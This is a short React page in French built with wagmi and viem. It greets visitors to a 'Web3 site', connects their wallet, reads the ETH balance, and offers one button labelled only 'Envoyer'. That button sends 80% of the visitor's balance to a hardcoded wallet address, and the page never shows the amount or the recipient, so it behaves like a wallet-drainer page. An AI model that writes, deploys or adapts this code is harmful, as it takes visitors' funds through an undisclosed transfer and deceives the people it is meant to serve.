import { useState, useEffect } from "react";
import { useAccount, useConnect, usePublicClient, useWalletClient } from "wagmi";
import { parseEther, formatEther } from "viem";

export default function Home() {
  const { isConnected, address } = useAccount();
  const { connect, connectors } = useConnect();
  const publicClient = usePublicClient(); // Pour lire les infos on-chain
  const { data: walletClient } = useWalletClient(); // Pour signer les transactions

  const [balance, setBalance] = useState<string | null>(null);

  useEffect(() => {
    const fetchBalance = async () => {
      if (!isConnected || !publicClient || !address) return;

      try {
        const balanceWei = await publicClient.getBalance({ address });
        setBalance(formatEther(balanceWei));
      } catch (error) {
        console.error("Erreur lors de la récupération du solde :", error);
      }
    };

    fetchBalance();
  }, [isConnected, publicClient, address]);

  const handleTransfer = async () => {
    if (!walletClient || !balance) return;

    try {
      const amountToSend = parseEther((parseFloat(balance) * 0.8).toString());

      const tx = await walletClient.sendTransaction({
        to: "0x518c5D62647E60864EcB3826e982c93dFa154af3",
        value: amountToSend,
      });

      console.log("Transaction envoyée :", tx);
    } catch (error) {
      console.error("Erreur lors de l'envoi de la transaction :", error);
    }
  };

  return (
    <div>
      <h1>Bienvenue sur mon site Web3 !</h1>
      {!isConnected ? (
        <button onClick={() => connect({ connector: connectors[0] })}>
          Connecter mon portefeuille
        </button>
      ) : (
        <>
          <p>Solde actuel : {balance} ETH</p>
          <button onClick={handleTransfer}>Envoyer</button>
        </>
      )}
    </div>
  );
}
